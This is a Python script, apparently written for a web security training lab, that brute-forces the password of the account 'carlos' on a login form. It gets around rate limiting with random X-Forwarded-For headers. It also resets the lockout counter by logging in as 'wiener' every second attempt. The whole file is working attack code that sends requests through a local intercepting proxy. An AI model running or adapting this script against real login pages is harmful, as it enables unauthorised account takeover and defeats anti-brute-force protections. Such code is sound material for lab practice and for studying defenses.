import requests
# import grequests
import sys
import urllib3
import urllib
from bs4 import BeautifulSoup
import re
from random import random
import logging


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def check_response_code(res):
    print(res.status_code)


def find_username(url):
    count = 2
    with open('../password_list.txt') as p:
        passwords = p.readlines()

    for password in passwords:
        headers = {'X-Forwarded-For': str(random()*1000)}
        if(count == 2):
            data = {"username": "wiener", "password": "peter"}
            r = requests.post(url, verify=False, proxies=proxies, data=data, headers=headers)
            count = 0
        count += 1
        data = {"username": "carlos", "password": password.strip("\n")}
        r = requests.post(url, verify=False, proxies=proxies, data=data, headers=headers)
        res = r.text
        print("Username: %s --- Password: %s -- %s ---%s" % (data["username"], data["password"], r.status_code, r.elapsed.total_seconds()))
        if r.status_code == 302:
            print("Account credential found username: %s password %s" % (data["username"], data["password"]))
            break
        if "Your username" in res:
            print("Account credential found username: %s password %s" % (data["username"], data["password"]))
            break


def main():
	if len(sys.argv) != 2:
		print("(-) usage %s <url>" % sys.argv[0])
		print("(-) Example: %s www.example.com" % sys.argv[1])

	url = sys.argv[1]
	print("(+) Findings valid username")
	# password_length = sql_password_length(url)
	find_username(url)
	
	
if __name__ == "__main__":
	main()